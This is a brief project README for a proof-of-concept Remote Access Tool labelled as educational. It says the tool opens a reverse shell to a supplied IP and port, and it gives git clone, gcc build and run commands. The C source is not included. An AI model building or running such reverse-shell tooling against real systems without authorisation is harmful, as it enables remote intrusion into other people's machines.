# RAT
This is a proof of concept Remote Access Tool. 
For educational purposes ONLY!

## Description
> There should be a listner waiting on the client side for this tool to work.

This is a very simple tool, that can create a reverse shell connection to a server when provided with **PORT** and **IP** address of a client to connect back to.

## Installation
> `git` and `gcc` should be installed beforehand. 
```
git clone https://github.com/vladisl0th/RAT.git
cd RAT
gcc rat.c -o rat
```

## Usage
```
./rat [IP] [PORT]
```
